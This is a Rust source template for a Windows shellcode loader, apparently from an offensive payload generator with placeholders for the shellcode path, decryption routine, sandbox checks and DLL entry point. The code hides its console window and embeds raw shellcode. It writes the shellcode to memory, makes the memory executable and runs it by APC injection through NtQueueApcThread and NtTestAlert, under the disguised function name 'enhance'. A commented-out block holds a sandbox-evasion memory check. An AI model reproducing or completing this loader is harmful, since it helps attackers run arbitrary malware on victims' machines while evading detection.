#![windows_subsystem = "windows"] 
#![allow(non_snake_case)]

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE}
    },
    shared::{
        ntdef::{NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use ntapi::ntpsapi::PPS_APC_ROUTINE;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use std::{ptr::null_mut};
use ntapi::ntpsapi::NtCurrentProcess;
use ntapi::ntpsapi::NtCurrentThread; 
use ntapi::ntmmapi::NtAllocateVirtualMemory;
use ntapi::ntmmapi::NtWriteVirtualMemory;
use ntapi::ntmmapi::NtProtectVirtualMemory;
use ntapi::ntpsapi::NtQueueApcThread;
use ntapi::ntpsapi::NtTestAlert;
//use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;


use std::include_bytes;
{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn enhance(mut buf: Vec<u8>) {
    unsafe {
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = NtAllocateVirtualMemory(NtCurrentProcess, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            panic!("Error allocating memory to the local process: {}", alloc_status);
        }
        
        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = NtWriteVirtualMemory(NtCurrentProcess, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            panic!("Error writing to the local process: {}", write_status);
        }

        let mut old_perms = PAGE_READWRITE;
        let protect_status = NtProtectVirtualMemory(NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
        if !NT_SUCCESS(protect_status) {
            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
        }

        let apc = NtQueueApcThread(NtCurrentThread, Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE, allocstart, null_mut(), null_mut());
        // thanks to https://github.com/trickster0/OffensiveRust/blob/c7629a285e8128348d7d7239e25db858064ad0e2/Injection_AES_Loader/src/main.rs
        if !NT_SUCCESS(apc) {
            panic!("Error failed to call QueueUqerAPC: {}", apc);
        }

        NtTestAlert();
    }
}

fn main() {
    {{SANDBOX}}
    
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    // Removing the sandobox check for now, as it fails on numerous Windows versions.
    /*
    let mut memory = 0;
    unsafe {
        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
        println!("{:#?}", is_quicksand);
        if is_quicksand != 1 {
            panic!("Hello.")
        }
    }
    */
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    {{MAIN}}
    enhance(vec.clone());
}

{{DLL_MAIN}}